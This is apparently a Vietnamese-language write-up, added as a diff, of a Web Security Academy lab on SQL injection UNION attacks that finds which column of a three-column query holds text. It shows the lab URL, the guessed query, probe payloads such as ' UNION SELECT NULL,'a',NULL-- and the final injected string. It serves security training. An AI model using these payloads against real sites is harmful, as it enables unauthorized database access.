@@ -1,0 +1,34 @@
+Đây là bài luyện tập SQL Injection
+
+Mục đích của bài luyện tập là tấn công tiêm nhiễm SQL UNION.
+Để tấn công tiêm nhiêm SQL UNION, bài luyện này hướng dẫn attacker tìm ra trường nào trong SELECT query có kiểu dữ liệu là text(string)
+
+Thật vậy, khi lựa chọn category để xem sản phẩm URL sẽ có dạng:
+https://0abd007e04125483c1d30e24006100c0.web-security-academy.net/filter?category=Gifts
+
+URL trên là đang cho ta kết quả xem các sản phẩm có category là Gifts, phỏng đoán câu lệnh query sẽ như sau
+
+SQL Query: SELECT các trường FROM product WHERE category = 'Gifts'
+
+Ở đây các trường là thứ chúng ta chưa biết là gì và số lượng là bao nhiêu, ví dụ có thể là : ID, Name, Money,....
+
+Để dò số lượng có thể tham khảo bài Lab: SQL injection UNION attack, determining the number of columns returned by the query
+
+Sau khi biết được số lượng ta sẽ dò cột nào có kiểu dữ liệu là text, ở bài này số lượng các cột là 3 nên command như sau:
+
+https://0abd007e04125483c1d30e24006100c0.web-security-academy.net/filter?category=Gifts' UNION SELECT 'a',NULL,NULL--
+SELECT các trường FROM product WHERE category = 'Gifts' UNION SELECT 'a',NULL,NULL--'
+
+Trường nào không phải text thì web response sẽ trả về lỗi hoặc không trả về gì cả, thử lần lượt với các command tiếp theo:
+' UNION SELECT 'a',NULL,NULL--
+' UNION SELECT NULL,'a',NULL--
+' UNION SELECT NULL,NULL,'a'--
+
+Kết quả, phát hiện được duy nhất cột thứ 2, command ' UNION SELECT NULL,'a',NULL-- trả về dữ liệu => cột thứ 2 là text
+Để complete bài lab, bài lab bắt kết quả trả về phải hiển thị thêm được 1 dòng có string theo bài lab đưa ra, ví dụ: 'P2anLv'
+
+Vì command SQL SELECT có cách hoạt động như sau: 
+Khi gọi SELECT 'x','y','z' => data trả về sẽ là cột 1: 'x', cột 2: 'y', cột 3:'z'. Do đó để append thêm 1 dòng có string 'P2anLv', ta làm như sau:
+
+https://0abd007e04125483c1d30e24006100c0.web-security-academy.net/filter?category=Gifts' UNION SELECT NULL,'P2anLv',NULL--
+SELECT các trường FROM product WHERE category = 'Gifts' UNION SELECT NULL,'P2anLv',NULL--'
